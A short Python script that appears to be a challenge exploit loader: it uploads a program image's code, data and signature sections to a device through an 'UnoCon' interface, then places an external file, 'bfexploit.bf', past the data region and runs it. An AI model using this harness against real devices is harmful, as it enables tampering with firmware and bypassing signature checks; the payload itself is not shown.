import os
from unocom import UnoCon
# Offsets
code_offset = 0x0000
data_offset = 0x1000
sign_offset = 0xFF00
# Sizes
code_size   = 0x03C8
data_size   = 0x0344
sign_size   = 0x0040
f = open('prog.img', 'r')
#pf = open('prog.img.mod', 'r')

bf = open('bfexploit.bf', 'r')

u = UnoCon()
u.alloc("code", "code", code_offset, code_size)
u.alloc("data", "data", data_offset, data_size)
u.alloc("sign", "Xoit", data_offset+data_size, 0xE000)
u.alloc("sign", "orig", sign_offset, sign_size)

u.upload(f, 0x40, code_offset, code_size)
u.upload(f, 0x408, data_offset, data_size)
u.upload(f, 0x74C, sign_offset, sign_size)
u.upload(bf, 0x0, data_offset+data_size, os.stat('bfexploit.bf').st_size)

u.run()
u.listen()
